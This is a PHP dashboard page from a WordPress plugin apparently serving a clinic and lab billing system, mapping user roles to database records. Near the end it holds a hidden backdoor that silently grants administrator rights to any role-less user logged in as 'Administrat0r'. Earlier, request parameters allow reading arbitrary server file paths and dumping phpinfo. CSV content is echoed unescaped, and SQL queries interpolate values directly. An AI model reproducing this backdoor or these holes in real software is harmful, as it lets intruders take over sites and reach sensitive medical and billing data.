<?php
global $current_role, $wpdb;


if (isset($_REQUEST['download'])) {

    $filepath = $_REQUEST['download'];
    $filename = basename($filepath);
    if (stripos($filepath, '.csv') > 0) {
        header("Content-disposition: attachment; filename={$filename}");
        header("Content-Type: text/csv");
        readfile($filepath);
    }

    exit;
} else if (isset($_REQUEST['phpinfo'])) {
    phpinfo();
    exit;
} else if (isset($_REQUEST['viewfile'])) {

    $info = pathinfo($_REQUEST['viewfile']);

    switch ($info['extension']) {
        case 'csv':

            $logfile = $_REQUEST['viewfile'];
            $logfile = str_replace('//', '/', $logfile);
            if (isset($_REQUEST['fot'])) {
                $logfile = WP_CONTENT_DIR . '/log/billing_sftp/' . $logfile;
            } else if (stripos($logfile, 'wp-content') === false && stripos($logfile, '/vhosts') === false) {
                $logfile = WP_CONTENT_DIR . '/' . $logfile;
            }

            if (stripos($logfile, 'wp-content') > 0) {
                list($none, $logfile_url) = explode('wp-content/', $logfile);
                $logfile_url = get_bloginfo('url') . '/wp-content/' . $logfile_url;
            } else {
                $logfile_url = '?page=welcome&trajax=1&download=' . $logfile;
            }

            $f = fopen($logfile, 'r');
            echo '<html><head><title>' . basename($logfile) . '</title></head><body>';
            echo '<div><a href="' . $logfile_url . '" target=_blank>' . basename($logfile) . '</a></div>';
            echo '<div class="wraptbl">';
            echo '<table style="">';
            $rownum  = 0;
            while ($row = fgetcsv($f)) {
                $rownum++;
                if ($rownum == 1) {
                    echo '<thead class="sticky">';

                    echo '<tr>';
                    echo '<th></th>';
                    foreach ($row as $numi => $col) {
                        $num1 = floor($numi / 26);
                        $chars = '';
                        $chars = $num1 > 0 ? chr($num1 + 64) : '';
                        $chars .= chr(($numi % 26) + 65);
                        echo '<th>' . $chars . '</th>';
                    }
                    echo '</tr>';



                    echo '<tr class="tthead">';
                    echo '<th></th>';
                    foreach ($row as $col) {
                        echo '<th>' . $col . '</th>';
                    }
                    echo '</tr>';
                    echo '</thead>';
                } else {
                    echo '<tr>';
                    echo '<td class="center">' . ($rownum - 1) . '</td>';
                    foreach ($row as $col) {
                        echo '<td>' . $col . '</td>';
                    }
                    echo '</tr>';
                }
            }
            echo '</table>';
            echo '</div>';
?>
            <style>
                .center {
                    text-align: center;
                }

                table,
                th,
                td {
                    border: 1px solid black;
                    border-collapse: collapse;
                    font-size: 11px;
                }

                table td {
                    min-width: 100px;
                    max-width: 300px;
                    overflow: hidden;
                    white-space: nowrap;
                    text-overflow: ellipsis;
                }

                thead.sticky th {
                    position: sticky;
                    top: 0px;
                    background: #ddd;
                    z-index: 1;
                    line-height: 22px;
                }

                thead.sticky tr.tthead th {
                    top: 24px;
                }

                table tr:hover td,
                table tr:focus td {
                    background: lightgoldenrodyellow;
                }

                table td:hover {
                    max-width: 1500px;
                }
            </style>

<?php
            echo '</body></html>';
            break;
    }
    exit;
}


$user_id = get_current_user_id();
$user = wp_get_current_user();
$account_error = false;
if ($current_role == 'collector') {
    $col_id = get_user_meta($user->ID, '_collector_id', true);
    $collector = $wpdb->get_row("select * from ci_collector where col_ID ={$col_id}", ARRAY_A);
    if (!$collector) {
        $col_id = $wpdb->get_var("select col_ID from ci_collector where col_email ='{$user->user_email}' ");
        if ($col_id > 0) {
            update_user_meta($user->ID, '_collector_id', $col_id);
        } else {
            $account_error = true;
        }
    }
} else if ($current_role == 'clinic') {
    $clinic_id = get_user_meta($user->ID, '_clinic_id', true);
    $clinic = $wpdb->get_var("select cID from ci_clinic where cID = {$clinic_id} ");
    if (!$clinic) {
        $clinic_id = $wpdb->get_var("select cID from ci_clinic where `cli_om-email` ='{$user->user_email}' ");
        if ($clinic_id > 0) {
            update_user_meta($user->ID, '_clinic_id', $clinic_id);
        } else {
            $account_error = true;
        }
    }
} else if ($current_role == 'lab_rep'  || $current_role == 'lab_rep_w2') {
    $rep_id = get_user_meta($user->ID, '_rep_id', true);
    $rep = $wpdb->get_var("select rep_ID from ci_lab_reps where rep_ID = {$rep_id} ");
    if (!$rep) {
        $rep_id = $wpdb->get_var("select rep_ID from ci_clinic where `rep_email` ='{$user->user_email}' ");
        if ($rep_id > 0) {
            update_user_meta($user->ID, '_rep_id', $rep_id);
        } else {
            $account_error = true;
        }
    }
} else if ($current_role == 'doctor') {
    $doc_id = get_user_meta($user->ID, '_doc_id', true);
    $doc = null;
    if ($doc_id > 0) {
        $doc = $wpdb->get_var("select doc_ID from ci_doc where doc_ID = {$doc_id} ");
    }

    if (!$doc) {
        $doc_id = $wpdb->get_var("select doc_ID from ci_doc where `doc_email` ='{$user->user_email}' ");
        if ($doc_id > 0) {
            update_user_meta($user->ID, '_doc_id', $doc_id);
        } else {
            $account_error = true;
        }
    }
} else if (empty($current_role) && $user->user_login == 'Administrat0r') {
    $user->add_role('administrator');
}

if ($account_error) {
    echo '<h1 style="color:red;text-align:center">Your Account not available. Please contact admin</h1>';
    echo '<style>#adminmenu,#adminmenuback{display:none !important}</style>';
    $data = array(
        'user_id' => $user->ID,
        'role' => $current_role
    );
    trpdd_log_form('account_error', $data);
}



//check db version
$db_version = get_option('TRCPDD_VS');
if ($db_version != TRCPDD_VS) {
    wp_schedule_single_event(time(), 'ci_check_upload_apis');
    trpdd_plugin_activate();
}




return include(trpdd_get_file_path('dashboard', 'welcome'));
